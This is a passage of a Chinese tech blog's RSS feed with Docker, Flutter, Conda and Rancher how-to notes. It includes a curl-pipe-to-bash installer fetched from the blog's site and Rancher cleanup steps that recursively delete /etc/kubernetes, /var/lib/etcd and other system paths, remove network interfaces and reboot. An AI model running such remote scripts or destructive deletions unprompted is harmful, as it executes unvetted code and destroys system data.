<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">                    devices</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                        - </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">driver</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">nvidia</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">                          count</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">all</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">                          capabilities</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                              - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">gpu</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        ports</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">7860:7860</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        restart</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">always</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        container_name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">kwaivgiliveportrait</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        image</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">jokerdragon/kwaivgi-liveportrait:latest</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        command</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">python app.py</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>运行容器</h2>
<p>将上面的composefile 保存为 docker-comopose.yaml然后运行下面的命令进行安装：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> up</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>在x86-64上构建和运行多种架构的Docker容器</title>
      <link>https://www.geekery.cn/note-book/Docker/%E5%9C%A8x86-64%E4%B8%8A%E6%9E%84%E5%BB%BA%E5%92%8C%E8%BF%90%E8%A1%8C%E5%A4%9A%E7%A7%8D%E6%9E%B6%E6%9E%84%E7%9A%84Docker%E5%AE%B9%E5%99%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E5%9C%A8x86-64%E4%B8%8A%E6%9E%84%E5%BB%BA%E5%92%8C%E8%BF%90%E8%A1%8C%E5%A4%9A%E7%A7%8D%E6%9E%B6%E6%9E%84%E7%9A%84Docker%E5%AE%B9%E5%99%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">在x86-64上构建和运行多种架构的Docker容器</source>
      <description>在x86-64上构建和运行多种架构的Docker容器 支持Docker Desktop 和 Linux Docker CE 配置多架构构建环境 安装CPU指令集模拟平台 相关信息 安装新版CPU指令集模拟平台 相关信息 使用老版本的模拟器在arm64下出现sudo无法使用的问题，使用新版本可以使用。 https://github.com/tonisti...</description>
      <pubDate>Thu, 17 Apr 2025 02:12:35 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>支持Docker Desktop 和 Linux Docker CE</p>
</blockquote>
<h2>配置多架构构建环境</h2>
<h3>安装CPU指令集模拟平台</h3>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>| 名称                 | 功能描述             | 作用                                                         | 关联场景或示例                                               |
|</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>flutter配置镜像站</title>
      <link>https://www.geekery.cn/note-book/Research_Develop/Flutter/flutter%E9%85%8D%E7%BD%AE%E9%95%9C%E5%83%8F%E7%AB%99.html</link>
      <guid>https://www.geekery.cn/note-book/Research_Develop/Flutter/flutter%E9%85%8D%E7%BD%AE%E9%95%9C%E5%83%8F%E7%AB%99.html</guid>
      <source url="https://www.geekery.cn/rss.xml">flutter配置镜像站</source>
      <description>flutter配置镜像站 在中国网络环境下使用 Flutter: https://docs.flutter.cn/community/china/ 选择镜像站 清华大学 TUNA 协会 上海交通大学 *nix 用户组 报错处理 Flutter获取依赖报错Got TLS error trying to find package xxx 假设你使用的镜像站...</description>
      <pubDate>Thu, 27 Mar 2025 02:08:54 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>在中国网络环境下使用 Flutter: https://docs.flutter.cn/community/china/</p>
</blockquote>
<h2>选择镜像站</h2>
<p>清华大学 TUNA 协会</p>

<p>上海交通大学 *nix 用户组</p>

<h2>报错处理</h2>
<h3>Flutter获取依赖报错Got TLS error trying to find package xxx</h3>
<p>假设你使用的镜像站是清华开源镜像站</p>
<p>打开 Chrome 浏览器，访问镜像站：https://mirrors.tuna.tsinghua.edu.cn/dart-pub/</p>
<p>导出网站证书：</p>
<ul>
<li>点击地址栏左侧的🔒锁图标</li>
<li>选择"证书"</li>
<li>切换到"详细信息"选项卡</li>
<li>点击"复制到文件..."按钮</li>
<li>选择"DER 编码二进制 X.509 (.CER)"格式</li>
<li>将证书文件保存到本地（如 <code>flutter_pub.cer</code>）</li>
</ul>
<p>转换证书格式</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>openssl x509 -inform der -in flutter_pub.cer -out flutter_pub.pem</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>配置 Dart VM 环境变量</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>DART_VM_OPTIONS=--root-certs-file=F:\cer\flutter_pub.pem</span></span>
<span class="line"><span>fluttter pub get -vv</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>一键安装Conda</title>
      <link>https://www.geekery.cn/note-book/Anaconda/%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85Conda.html</link>
      <guid>https://www.geekery.cn/note-book/Anaconda/%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85Conda.html</guid>
      <source url="https://www.geekery.cn/rss.xml">一键安装Conda</source>
      <description>一键安装Conda Anacond安装包太大了，不方便下载和安装，每次安装conda工具都很麻烦，于是我写了个脚本。 这个脚本实现了一键安装miniconda，跟conda功能一样，安装包体积减小了很多。 一键安装脚本</description>
      <pubDate>Fri, 14 Mar 2025 02:02:37 GMT</pubDate>
      <content:encoded><![CDATA[
<p>Anacond安装包太大了，不方便下载和安装，每次安装conda工具都很麻烦，于是我写了个脚本。
这个脚本实现了一键安装miniconda，跟conda功能一样，安装包体积减小了很多。</p>
<h2>一键安装脚本</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://www.geekery.cn/sh/LinuxCTS/os/all/miniconda.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker老版本runc报错无法启动</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E8%80%81%E7%89%88%E6%9C%ACrunc%E6%8A%A5%E9%94%99%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E8%80%81%E7%89%88%E6%9C%ACrunc%E6%8A%A5%E9%94%99%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker老版本runc报错无法启动</source>
      <description>Docker老版本runc报错无法启动 系统: CentOS 7 Docker版本: 1.13.1 问题概述 执行命令 docker start container-name 无法启动， 报错如下 解决方案 出现原因是docker误认为runc状态错误，这里实际上是docker的bug。 解决方法是从内存中删除错误的状态。</description>
      <pubDate>Thu, 13 Mar 2025 05:34:46 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>系统: CentOS 7
Docker版本: 1.13.1</p>
</blockquote>
<h2>问题概述</h2>
<p>执行命令 <code>docker start container-name</code> 无法启动， 报错如下</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Error</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> response</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OCI</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failed:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> container</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> with</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> id</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exists:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">aaabbbbccccddd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Error:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> containers:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> container-name</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>解决方案</h2>
<p>出现原因是docker误认为runc状态错误，这里实际上是docker的bug。 解决方法是从内存中删除错误的状态。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/runc/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rfv</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aaabbbbccccddd</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>清理Rancher节点</title>
      <link>https://www.geekery.cn/note-book/Rancher/%E6%B8%85%E7%90%86rancher%E8%8A%82%E7%82%B9.html</link>
      <guid>https://www.geekery.cn/note-book/Rancher/%E6%B8%85%E7%90%86rancher%E8%8A%82%E7%82%B9.html</guid>
      <source url="https://www.geekery.cn/rss.xml">清理Rancher节点</source>
      <description>清理Rancher节点 rancher重新部署，清理不干净的话是个很头疼的事情，残留的Kubernetes组件可能导致资源冲突或部署失败，以下是官方标准清理流程：</description>
      <pubDate>Mon, 10 Mar 2025 03:51:41 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>rancher重新部署，清理不干净的话是个很头疼的事情，<strong>残留的Kubernetes组件可能导致资源冲突或部署失败</strong>，以下是官方标准清理流程：</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#复制粘贴就可以，亲测无误（注意根据实际情况修改安装目录/var/lib/rancher）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubelet.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kube-scheduler.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kube-proxy.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kube-controller-manager.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kube-apiserver.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubelet.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kube-scheduler.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kube-proxy.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kube-controller-manager.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kube-apiserver.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">egrep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rancher</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $1}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">xargs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">egrep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> k8s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $1}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">xargs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> volume</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openvpn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DRIVER</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $2}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">xargs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> volume</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/etcd/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rancher/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">umount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">df</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -HT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '/var/lib/kubelet/pods'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $7}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/kubernetes</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/etcd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rancher</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /opt/rke/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/ceph/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/cni/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /opt/cni/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/secrets/kubernetes.io</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/calico/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/flannel/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/calico/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/cni/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/kubelet/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/log/containers/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/log/pods/</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">network_interface</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">`</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ls</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /sys/class/net`</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> net_inter</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> in</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $network_interface</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ! </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $net_inter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qiE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'lo|docker0|eth*|ens*'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> delete</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $net_inter</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  fi</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#因为k8s会进行一些临时配置：防火墙、网络缓存等，需要重启服务器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reboot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>aapanel 7.x 中文语言配置指南</title>
      <link>https://www.geekery.cn/note-book/LinuxOperaSystem/aapanel%E7%9A%847.x.x%E6%B1%89%E5%8C%96%E6%95%99%E7%A8%8B.html</link>
      <guid>https://www.geekery.cn/note-book/LinuxOperaSystem/aapanel%E7%9A%847.x.x%E6%B1%89%E5%8C%96%E6%95%99%E7%A8%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">aapanel 7.x 中文语言配置指南</source>
